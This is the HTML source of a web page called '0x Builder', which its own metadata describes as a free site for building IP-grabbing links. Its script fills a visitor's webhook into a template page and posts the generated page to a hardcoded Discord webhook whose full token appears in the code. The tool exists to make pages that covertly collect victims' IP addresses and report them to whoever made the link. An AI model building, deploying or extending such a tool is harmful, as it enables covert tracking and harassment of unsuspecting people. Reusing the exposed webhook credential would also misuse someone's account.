<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Input Form Page</title>
    <!-- Open Graph Metadata -->
    <meta property="og:title" content="0x Builder">
    <meta property="og:description" content="0x Builder is a free website to build your IP grabbing links. By .gekkefries1">
    <meta property="og:image" content="https://i.ibb.co/W2DQr84/james-in-amry.png">
    <meta property="og:url" content="https://gekkefries.github.io/0x/">
    <meta property="og:type" content="website">
    <meta name="theme-color" content="#D42CE3">

    <style>
        body {
            background-color: #18181B;
            margin: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            position: relative;
        }
        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            position: relative;
            z-index: 1;
        }
        .container::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 400px;
            height: 200px;
            background: #D42CE3;
            filter: blur(50px);
            transform: translate(-50%, -50%);
            z-index: -1;
        }
        input, button {
            margin: 10px;
            padding: 10px;
            font-size: 16px;
            border-radius: 8px;
            border: 1px solid #B030B8;
        }
        input {
            width: 200px;
        }
        button {
            background-color: #D42CE3;
            color: white;
            border: 2px solid #B030B8;
            cursor: pointer;
        }
        button:hover {
            background-color: #B030B8;
        }
        .glow {
            position: absolute;
            width: 20px;
            height: 20px;
            background: #D42CE3;
            border-radius: 50%;
            filter: blur(10px);
            animation: glowAnimation 3s infinite;
            opacity: 0;
        }
        @keyframes glowAnimation {
            0%, 100% {
                opacity: 0;
                transform: translateY(0) scale(1);
            }
            50% {
                opacity: 1;
                transform: translateY(-20px) scale(1.5);
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <input id="websiteName" type="text" placeholder="Website Name">
        <input id="webhook" type="text" placeholder="Webhook">
        <button onclick="createAndSendFile()">Create and Send</button>
    </div>
    <script>
        async function createAndSendFile() {
            const websiteName = document.getElementById('websiteName').value;
            const webhook = document.getElementById('webhook').value;
            const discordWebhookUrl = 'https://discord.com/api/webhooks/1249796448187453443/yVCwBqCuj8j_YBq1MNNpB0orhINA5411WS3f-PQ4y4PrCnFBZfX9LDumINxo_0x7MHB3';

            if (!websiteName || !webhook) {
                alert('Please enter both Website Name and Webhook.');
                return;
            }

            // Fetch the content of the original HTML file
            const response = await fetch('original.html');
            if (!response.ok) {
                alert('Failed to load original.html');
                return;
            }
            let originalContent = await response.text();

            // Replace the placeholder with the actual webhook
            const modifiedContent = originalContent.replace(/WEBHOOK_HERE/g, webhook);

            // Create a Blob from the modified content
            const blob = new Blob([modifiedContent], { type: 'text/html' });
            const formData = new FormData();
            formData.append('file', blob, `${websiteName}.html`);

            try {
                const result = await fetch(discordWebhookUrl, {
                    method: 'POST',
                    body: formData
                });

                if (result.ok) {
                    alert(`Website ${websiteName} sent successfully!`);
                } else {
                    alert('Failed to send the website content to the Discord webhook.');
                }
            } catch (error) {
                console.error('Error:', error);
                alert('An error occurred while sending the website content.');
            }
        }

        function createGlow() {
            const glow = document.createElement('div');
            glow.className = 'glow';
            glow.style.top = `${Math.random() * 100}vh`;
            glow.style.left = `${Math.random() * 100}vw`;
            document.body.appendChild(glow);
            setTimeout(() => {
                glow.remove();
            }, 3000);
        }

        setInterval(createGlow, 500);
    </script>
</body>
</html>
